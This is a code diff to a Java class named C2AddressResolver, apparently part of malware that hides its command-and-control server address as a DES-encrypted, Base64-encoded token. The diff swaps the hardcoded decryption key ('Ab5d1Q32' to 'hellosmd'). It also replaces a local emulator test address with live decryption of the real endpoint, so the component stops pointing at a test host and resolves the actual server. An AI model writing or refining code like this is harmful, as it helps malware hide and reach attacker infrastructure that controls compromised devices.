@@ -15,7 +15,7 @@ public final class C2AddressResolver {
         // Sanitize token to handle both Standard and URL-safe Base64
         String sanitized = token.trim().replace('-', '+').replace('_', '/');
         byte[] decoded = Base64.getDecoder().decode(sanitized);
-        byte[] plain = desCbcPkcs5Decrypt(decoded, "Ab5d1Q32");
+        byte[] plain = desCbcPkcs5Decrypt(decoded, "hellosmd");
         return new String(plain, StandardCharsets.UTF_8);
     }
 
@@ -102,8 +102,7 @@ public final class C2AddressResolver {
                 return null;
             }
 
-//            return decryptEndpointToken(encodedToken.trim() + "==");
-                return "10.0.2.2:8765";
+            return decryptEndpointToken(encodedToken.trim() + "==");
 
         } catch (Exception ex) {
             ex.printStackTrace();
